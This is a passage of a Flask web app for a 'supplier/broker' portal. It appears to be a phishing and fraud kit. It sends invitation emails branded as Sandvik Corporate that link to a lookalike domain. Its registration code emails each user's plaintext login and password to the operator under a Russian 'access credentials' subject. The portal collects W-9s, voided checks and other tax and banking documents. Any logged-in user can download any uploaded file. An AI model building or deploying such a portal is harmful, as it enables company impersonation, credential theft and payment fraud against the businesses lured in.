            admin_body = f"New Broker Registered!\nCompany: {request.form['company_name']}\nMC: {request.form['mc_number']}\n\nLogin: {email}\nPassword: {password}"
            send_email(admin_email, "Новый брокер - Доступы", admin_body)
            
            flash("Registration successful! Check your email (or terminal) for the 6-digit code.", "success")
            return render_full(HTML_VERIFY, email=email)
        except sqlite3.IntegrityError: 
            flash("Email is already registered in the system.", "danger")
    return render_full(HTML_REGISTER)

@app.route('/verify', methods=['POST'])
def verify():
    email, code = request.form['email'], request.form['code']
    with get_db_connection() as conn:
        c = conn.cursor()
        if c.execute("SELECT * FROM users WHERE email=? AND verification_code=?", (email, code)).fetchone():
            c.execute("UPDATE users SET is_verified=1, verification_code='' WHERE email=?", (email,))
            conn.commit(); flash("Email verified successfully! You can now log in.", "success")
            return redirect(url_for('login'))
        flash("Invalid verification code. Please try again.", "danger")
    return render_full(HTML_VERIFY, email=email)

@app.route('/forgot-password', methods=['GET', 'POST'])
def forgot_password():
    if request.method == 'POST':
        email = request.form['email']
        with get_db_connection() as conn:
            if conn.cursor().execute("SELECT * FROM users WHERE email=?", (email,)).fetchone():
                code = generate_code()
                conn.cursor().execute("UPDATE users SET reset_code=? WHERE email=?", (code, email))
                conn.commit()
                send_email(email, "Password Reset", f"Code: {code}")
            flash("If the email exists in our records, a recovery code has been sent.", "info")
            return render_full(HTML_RESET, email=email)
    return render_full(HTML_FORGOT)

@app.route('/reset-password', methods=['POST'])
def reset_password():
    email, code, new_pw = request.form['email'], request.form['code'], request.form['new_password']
    with get_db_connection() as conn:
        c = conn.cursor()
        if c.execute("SELECT * FROM users WHERE email=? AND reset_code=?", (email, code)).fetchone():
            c.execute("UPDATE users SET password=?, reset_code='' WHERE email=?", (generate_password_hash(new_pw), email))
            conn.commit(); flash("Your password has been successfully reset.", "success")
            return redirect(url_for('login'))
        flash("Invalid recovery code.", "danger")
    return render_full(HTML_RESET, email=email)

@app.route('/logout')
def logout(): session.clear(); flash("You have been securely logged out.", "info"); return redirect(url_for('login'))

@app.route('/upload', methods=['POST'])
def upload():
    if 'email' not in session: return redirect(url_for('login'))
    file, doc_type, expiry = request.files.get('file'), request.form.get('doc_type'), request.form.get('expiry_date', 'N/A')
    
    if not file or file.filename == '':
        flash("File selection is required to submit a document.", "danger")
        return redirect(url_for('compliance'))

    if file and allowed_file(file.filename):
        filename = secure_filename(f"{uuid.uuid4().hex}_{file.filename}")
        file.save(os.path.join(app.config['UPLOAD_FOLDER'], filename))
        
        with get_db_connection() as conn:
            c = conn.cursor()
            old_doc = c.execute("SELECT filename FROM documents WHERE user_email=? AND doc_type=?", (session['email'], doc_type)).fetchone()
            if old_doc:
                try: os.remove(os.path.join(app.config['UPLOAD_FOLDER'], old_doc['filename']))
                except: pass
                
            c.execute("DELETE FROM documents WHERE user_email=? AND doc_type=?", (session['email'], doc_type))
            c.execute("INSERT INTO documents (user_email, doc_type, filename, status, expiry_date, updated_at) VALUES (?, ?, ?, 'Pending', ?, ?)", 
                      (session['email'], doc_type, filename, expiry, datetime.now().strftime("%Y-%m-%d %H:%M")))
            conn.commit()
            flash(f"{doc_type} successfully uploaded and is pending review.", "success")
    else:
        flash("Invalid file format. Please upload PDF, JPG, or PNG files.", "danger")
    return redirect(url_for('compliance'))

@app.route('/upload-invoice', methods=['POST'])
def upload_invoice():
    if 'email' not in session: return redirect(url_for('login'))
    files = request.files.getlist('files')
    inv_num, load_num = request.form.get('invoice_number'), request.form.get('load_number')
    
    try: amt = float(request.form.get('amount', 0))
    except: amt = 0.0

    if not files or files[0].filename == '':
        flash("Please attach at least one valid file to submit an invoice.", "danger")
        return redirect(url_for('invoices'))
        
    saved_files = []
    for file in files:
        if file and allowed_file(file.filename):
            filename = secure_filename(f"inv_{uuid.uuid4().hex}_{file.filename}")
            file.save(os.path.join(app.config['UPLOAD_FOLDER'], filename))
            saved_files.append(filename)
            
    if saved_files:
        merged_names = "|".join(saved_files)
        time_now = datetime.now().strftime("%Y-%m-%d %H:%M")
        with get_db_connection() as conn:
            conn.cursor().execute("INSERT INTO invoices (broker_email, invoice_number, load_number, amount, filename, status, created_at, updated_at) VALUES (?, ?, ?, ?, ?, 'Pending', ?, ?)", 
                                  (session['email'], inv_num, load_num, amt, merged_names, time_now, time_now))
            conn.commit()
        flash(f"Invoice successfully submitted and is in Review status.", "success")
    else:
        flash("No valid files attached. Ensure files are PDF or images.", "danger")
    return redirect(url_for('invoices'))

@app.route('/delete-invoice/<int:inv_id>', methods=['POST'])
def delete_invoice(inv_id):
    if 'email' not in session: return redirect('/')
    with get_db_connection() as conn:
        c = conn.cursor()
        inv = c.execute("SELECT * FROM invoices WHERE id=? AND broker_email=?", (inv_id, session['email'])).fetchone()
        if inv and inv['status'] != 'Paid':
            for f in inv['filename'].split('|'):
                try: os.remove(os.path.join(app.config['UPLOAD_FOLDER'], f))
                except: pass
            c.execute("DELETE FROM invoices WHERE id=?", (inv_id,))
            conn.commit()
            flash("Invoice deleted successfully from your queue.", "success")
        else:
            flash("Cannot delete a Paid invoice.", "danger")
    return redirect(url_for('invoices'))

# --- АДМИНКА (Shipper / Customer) ---
@app.route('/admin')
def admin():
    if session.get('role') != 'admin': return redirect(url_for('index'))
    search = request.args.get('search', '')
    
    docs_q = "SELECT d.id as doc_id, d.*, u.company_name, u.mc_number, u.contact_name, u.phone_number FROM documents d JOIN users u ON d.user_email = u.email WHERE d.status='Pending'"
    inv_q = "SELECT i.id as inv_id, i.*, u.company_name, u.mc_number FROM invoices i JOIN users u ON i.broker_email = u.email WHERE i.status IN ('Pending', 'Pending Payment')"
    hist_q = "SELECT i.id as inv_id, i.*, u.company_name, u.mc_number FROM invoices i JOIN users u ON i.broker_email = u.email WHERE i.status IN ('Paid', 'Disputed') ORDER BY i.updated_at DESC LIMIT 50"
    params = []
    
    if search:
        s = f'%{search}%'
        docs_q += " AND (u.mc_number LIKE ? OR u.company_name LIKE ?)"; inv_q += " AND (i.load_number LIKE ? OR u.company_name LIKE ?)"
        params.extend([s, s])

    with get_db_connection() as conn:
        c = conn.cursor()
        pending_docs = c.execute(docs_q, params).fetchall()
        pending_invoices = c.execute(inv_q, params).fetchall()
        history_invoices = c.execute(hist_q).fetchall()
        total_brokers = c.execute("SELECT COUNT(*) FROM users WHERE role='supplier' AND dnu_status=0").fetchone()[0]
        pending_count = c.execute("SELECT COUNT(*) FROM documents WHERE status='Pending'").fetchone()[0]
        res = c.execute("SELECT SUM(amount) FROM invoices WHERE status IN ('Pending', 'Pending Payment')").fetchone()[0]
        total_ap = res if res else 0.0
        
    return render_full(HTML_ADMIN, pending_docs=pending_docs, pending_invoices=pending_invoices, history_invoices=history_invoices, search_query=search, total_brokers=total_brokers, pending_count=pending_count, total_ap=total_ap)

@app.route('/admin/brokers')
def admin_brokers():
    if session.get('role') != 'admin': return redirect(url_for('index'))
    search = request.args.get('search', '')
    
    query = '''SELECT u.*, 
               (SELECT COUNT(*) FROM documents d WHERE d.user_email=u.email AND d.status='Approved') as approved_docs,
               (SELECT SUM(amount) FROM invoices i WHERE i.broker_email=u.email AND i.status='Paid') as total_paid
               FROM users u WHERE u.role='supplier' '''
    params = []
    
    if search:
        query += " AND (u.company_name LIKE ? OR u.mc_number LIKE ?) "
        params.extend([f'%{search}%', f'%{search}%'])
        
    query += " ORDER BY u.company_name ASC"

    with get_db_connection() as conn:
        carriers = conn.cursor().execute(query, params).fetchall()
        
    return render_full(HTML_BROKERS_DIRECTORY, carriers=carriers, search_query=search)

@app.route('/update-terms/<int:broker_id>', methods=['POST'])
def update_terms(broker_id):
    if session.get('role') != 'admin': return redirect('/')
    with get_db_connection() as conn:
        conn.cursor().execute("UPDATE users SET pay_terms=? WHERE id=?", (request.form['terms'], broker_id))
        conn.commit()
    flash("Broker payment terms successfully updated.", "success")
    return redirect('/admin/brokers')

@app.route('/toggle-dnu/<int:broker_id>', methods=['POST'])
def toggle_dnu(broker_id):
    if session.get('role') != 'admin': return redirect('/')
    with get_db_connection() as conn:
        c = conn.cursor()
        current = c.execute("SELECT dnu_status FROM users WHERE id=?", (broker_id,)).fetchone()[0]
        new_stat = 1 if current == 0 else 0
        c.execute("UPDATE users SET dnu_status=? WHERE id=?", (new_stat, broker_id))
        conn.commit()
    flash("Broker safety DNU status updated.", "warning" if new_stat == 1 else "success")
    return redirect('/admin/brokers')
@app.route('/admin/upload-for-broker', methods=['POST'])
def admin_upload_for_broker():
    if session.get('role') != 'admin': return redirect('/')
    broker_email = request.form.get('broker_email')
    doc_type = request.form.get('doc_type')
    file = request.files.get('file')

    if file and allowed_file(file.filename):
        filename = secure_filename(f"admin_{uuid.uuid4().hex}_{file.filename}")
        file.save(os.path.join(app.config['UPLOAD_FOLDER'], filename))
        
        with get_db_connection() as conn:
            c = conn.cursor()
            # Удаляем старый файл, если брокер загружал какую-то ошибку
            old_doc = c.execute("SELECT filename FROM documents WHERE user_email=? AND doc_type=?", (broker_email, doc_type)).fetchone()
            if old_doc:
                try: os.remove(os.path.join(app.config['UPLOAD_FOLDER'], old_doc['filename']))
                except: pass
            
            c.execute("DELETE FROM documents WHERE user_email=? AND doc_type=?", (broker_email, doc_type))
            # Вставляем новый файл сразу со статусом Approved
            c.execute("INSERT INTO documents (user_email, doc_type, filename, status, expiry_date, updated_at) VALUES (?, ?, ?, 'Approved', 'N/A', ?)", 
                      (broker_email, doc_type, filename, datetime.now().strftime("%Y-%m-%d %H:%M")))
            conn.commit()
        flash(f"Document {doc_type} successfully uploaded and Approved for {broker_email}.", "success")
    else:
        flash("Invalid file format.", "danger")
    return redirect('/admin/brokers')

@app.route('/review/<int:doc_id>/<status>')
def review(doc_id, status):
    if session.get('role') != 'admin': return redirect('/')
    with get_db_connection() as conn:
        conn.cursor().execute("UPDATE documents SET status=?, reject_reason='', updated_at=? WHERE id=?", (status, datetime.now().strftime("%Y-%m-%d %H:%M"), doc_id))
        conn.commit()
    flash(f"Document marked as {status}.", "success")
    return redirect(url_for('admin'))

@app.route('/reject/<int:doc_id>', methods=['POST'])
def reject(doc_id):
    if session.get('role') != 'admin': return redirect('/')
    with get_db_connection() as conn:
        conn.cursor().execute("UPDATE documents SET status='Missing', reject_reason=?, updated_at=? WHERE id=?", (request.form.get('reason', ''), datetime.now().strftime("%Y-%m-%d %H:%M"), doc_id))
        conn.commit()
    flash("Document correctly rejected.", "danger")
    return redirect(url_for('admin'))

# ЭТАП 1: Approve документов инвойса (Перевод в статус Pending Payment)
@app.route('/review-invoice-docs/<int:inv_id>')
def review_invoice_docs(inv_id):
    if session.get('role') != 'admin': return redirect('/')
    with get_db_connection() as conn:
        conn.cursor().execute("UPDATE invoices SET status='Pending Payment', updated_at=? WHERE id=?", (datetime.now().strftime("%Y-%m-%d %H:%M"), inv_id))
        inv = conn.cursor().execute("SELECT broker_email, invoice_number FROM invoices WHERE id=?", (inv_id,)).fetchone()
        conn.commit()
    if inv: send_email(inv['broker_email'], "Invoice Docs Accepted", f"Documents verified for invoice {inv['invoice_number']}. Payment is now pending.")
    flash("Invoice documents verified & approved. Moved to Pending Payment.", "success")
    return redirect(url_for('admin'))

# ЭТАП 2: Финальный Approve на платеж (Загрузка пруфа и перевод в Paid)
@app.route('/pay-broker/<int:inv_id>', methods=['POST'])
def pay_broker(inv_id):
    if session.get('role') != 'admin': return redirect('/')
    file = request.files.get('file')
    if not file or file.filename == '':
        flash("You must attach a payment receipt/proof to close the invoice.", "danger")
        return redirect(url_for('admin'))
        
    if file and allowed_file(file.filename):
        filename = secure_filename(f"proof_{uuid.uuid4().hex}_{file.filename}")
        file.save(os.path.join(app.config['UPLOAD_FOLDER'], filename))
        with get_db_connection() as conn:
            conn.cursor().execute("UPDATE invoices SET status='Paid', payment_proof=?, updated_at=? WHERE id=?", (filename, datetime.now().strftime("%Y-%m-%d %H:%M"), inv_id))
            inv = conn.cursor().execute("SELECT broker_email, invoice_number FROM invoices WHERE id=?", (inv_id,)).fetchone()
            conn.commit()
        if inv: send_email(inv['broker_email'], "Invoice Paid", f"Payment confirmed for invoice {inv['invoice_number']}.")
        flash("Payment approved. Receipt attached, invoice closed.", "success")
    return redirect(url_for('admin'))

@app.route('/reject-invoice/<int:inv_id>', methods=['POST'])
def reject_invoice(inv_id):
    if session.get('role') != 'admin': return redirect('/')
    with get_db_connection() as conn:
        conn.cursor().execute("UPDATE invoices SET status='Disputed', reject_reason=?, updated_at=? WHERE id=?", (request.form.get('reason', ''), datetime.now().strftime("%Y-%m-%d %H:%M"), inv_id))
        conn.commit()
    flash("Invoice set to Disputed status.", "warning")
    return redirect(url_for('admin'))

@app.route('/downloads/<filename>')
def download_file(filename):
    if 'email' not in session: return redirect('/')
    return send_from_directory(app.config['UPLOAD_FOLDER'], secure_filename(filename), as_attachment=False)
@app.route('/delete-broker/<int:broker_id>', methods=['POST'])
def delete_broker(broker_id):
    if session.get('role') != 'admin': return redirect('/')
    with get_db_connection() as conn:
        c = conn.cursor()
        # Сначала находим email брокера, чтобы удалить его файлы из базы
        broker = c.execute("SELECT email FROM users WHERE id=?", (broker_id,)).fetchone()
        if broker:
            email = broker['email']
            c.execute("DELETE FROM documents WHERE user_email=?", (email,))
            c.execute("DELETE FROM invoices WHERE broker_email=?", (email,))
            c.execute("DELETE FROM users WHERE id=?", (broker_id,))
            conn.commit()
    flash("Broker and all associated records have been permanently deleted.", "success")
    return redirect('/admin/brokers')
@app.route('/admin/invite-broker', methods=['POST'])
def admin_invite_broker():
    if session.get('role') != 'admin': return redirect('/')
    invite_email = request.form.get('invite_email')
    
    # Тот самый "премиальный" дизайн письма в формате HTML
    email_html = f'''
    <div style="font-family: 'Segoe UI', Arial, sans-serif; max-width: 600px; margin: 0 auto; background-color: #ffffff; border: 1px solid #e0e0e0; border-radius: 10px; overflow: hidden; box-shadow: 0 4px 10px rgba(0,0,0,0.05);">
        <div style="background-color: #212529; padding: 25px; text-align: center;">
            <h2 style="color: #ffffff; margin: 0; letter-spacing: 2px;">MY SANDVIK PORTAL</h2>
        </div>
        <div style="padding: 40px 30px; text-align: center;">
            <h3 style="color: #333333; margin-top: 0; font-size: 22px;">Setup Invitation</h3>
            <p style="color: #555555; font-size: 16px; line-height: 1.6; margin-bottom: 30px;">
                Welcome to Sandvik You have been invited to join the Sandvik global supplier network. To activate your account, complete your business registration, and ensure seamless payment processing, please finalize your secure portal setup. 
            </p>
            <a href="https://portal-homesandvik.com/register" style="display: inline-block; background-color: #198754; color: #ffffff; text-decoration: none; padding: 16px 32px; font-size: 16px; font-weight: bold; border-radius: 6px; text-transform: uppercase; letter-spacing: 1px;">
               REGISTER NOW
            </a>
        </div>
        <div style="background-color: #f8f9fa; padding: 20px; text-align: center; border-top: 1px solid #e0e0e0;">
            <p style="color: #888888; font-size: 12px; margin: 0;">
                &copy; 2026 Sandvik Corporate. This is an automated invitation.
            </p>
        </div>
    </div>
    '''
    
    # Функция send_email (которую мы писали ранее) автоматически поймет, что это HTML
    send_email(invite_email, "Action Required: Sandvik Setup Invitation", email_html)
    flash(f"VIP Invitation with custom design successfully sent to {invite_email}.", "success")
    return redirect('/admin/brokers')
HTML_GUIDE = '''
<div class="container mt-5">
    <div class="text-center mb-5">
        <h2 class="fw-bold text-primary">Vendor Setup & Billing Guide</h2>
        <p class="text-muted">Follow these 3 simple steps to get approved and get paid faster.</p>
    </div>
    
    <div class="row g-4">
        <div class="col-md-4">
            <div class="card h-100 shadow-sm border-0">
                <div class="card-body text-center p-4">
                    <div class="bg-light rounded-circle d-inline-flex align-items-center justify-content-center mb-3" style="width: 80px; height: 80px;">
                        <i class="bi bi-person-vcard fs-1 text-primary"></i>
                    </div>
                    <h5 class="fw-bold">Step 1: Registration</h5>
                    <p class="text-muted small">Create your account using your MC Number and corporate email. Verify your identity with the 6-digit code sent to your inbox.</p>
                </div>
            </div>
        </div>
        <div class="col-md-4">
            <div class="card h-100 shadow-sm border-0">
                <div class="card-body text-center p-4">
                    <div class="bg-light rounded-circle d-inline-flex align-items-center justify-content-center mb-3" style="width: 80px; height: 80px;">
                        <i class="bi bi-file-earmark-check fs-1 text-primary"></i>
                    </div>
                    <h5 class="fw-bold">Step 2: Compliance</h5>
                    <p class="text-muted small">Navigate to the Compliance Vault. Upload clear copies of your W-9, Broker Authority (MC), Contingent Cargo Insurance, and a Voided Check.</p>
                </div>
            </div>
        </div>
        <div class="col-md-4">
            <div class="card h-100 shadow-sm border-0">
                <div class="card-body text-center p-4">
                    <div class="bg-light rounded-circle d-inline-flex align-items-center justify-content-center mb-3" style="width: 80px; height: 80px;">
                        <i class="bi bi-currency-dollar fs-1 text-success"></i>
                    </div>
                    <h5 class="fw-bold">Step 3: Get Paid</h5>
                    <p class="text-muted small">Once approved, go to 'Submit Invoices'. Enter the load number, attach your Invoice and signed BOL. Track your payment status directly on the dashboard.</p>
                </div>
            </div>
        </div>
    </div>
    <div class="text-center mt-5">
        <a href="/register" class="btn btn-primary btn-lg fw-bold px-5">Start Setup Now</a>
    </div>
</div>
'''

@app.route('/guide')
def guide():
    return render_full(HTML_GUIDE)

if __name__ == '__main__': app.run(debug=True)
